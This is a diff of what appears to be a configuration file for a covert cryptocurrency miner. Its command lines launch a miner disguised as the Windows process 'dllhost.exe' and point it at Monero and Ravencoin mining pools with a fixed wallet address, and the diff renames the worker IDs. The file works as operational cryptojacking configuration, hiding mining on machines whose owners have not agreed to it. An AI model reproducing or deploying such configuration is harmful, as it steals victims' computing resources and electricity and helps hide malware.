@@ -1,7 +1,7 @@
 MLB--\dllhost.exe  --donate-level 1 --cuda-max-threads=N --cuda-bfactor=12 --cuda-bsleep=101 -o stratum+tcp://xmr.antpool.com:9005 -u 4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGj2L4NBE3iECDaERc.999 -p x -k--MLB
 
 
-A7A--\dllhost.exe -o stratum+tcp://rvn.antpool.com:9003 -a x16r -u RUPjHM6bXsCzKLaC1upV8XCoMw7DC6pwaP.12 -i 12 -p x--A7A
-A1A--\dllhost.exe -o stratum+tcp://rvn.antpool.com:9003 -a x16r -u RUPjHM6bXsCzKLaC1upV8XCoMw7DC6pwaP.12 -i 12 -p x--A1A
-A2A--\dllhost.exe -o stratum+tcp://rvn.antpool.com:9003 -a x16r -u RUPjHM6bXsCzKLaC1upV8XCoMw7DC6pwaP.14 -i 14 -p x--A2A
-A3A--\dllhost.exe -o stratum+tcp://rvn.antpool.com:9003 -a x16r -u RUPjHM6bXsCzKLaC1upV8XCoMw7DC6pwaP.14 -i 14 -p x--A3A
+A7A--\dllhost.exe -o stratum+tcp://rvn.antpool.com:9003 -a x16r -u RUPjHM6bXsCzKLaC1upV8XCoMw7DC6pwaP.12GIT -i 12 -p x--A7A
+A1A--\dllhost.exe -o stratum+tcp://rvn.antpool.com:9003 -a x16r -u RUPjHM6bXsCzKLaC1upV8XCoMw7DC6pwaP.12GIT -i 12 -p x--A1A
+A2A--\dllhost.exe -o stratum+tcp://rvn.antpool.com:9003 -a x16r -u RUPjHM6bXsCzKLaC1upV8XCoMw7DC6pwaP.14GIT -i 14 -p x--A2A
+A3A--\dllhost.exe -o stratum+tcp://rvn.antpool.com:9003 -a x16r -u RUPjHM6bXsCzKLaC1upV8XCoMw7DC6pwaP.14GIT -i 14 -p x--A3A
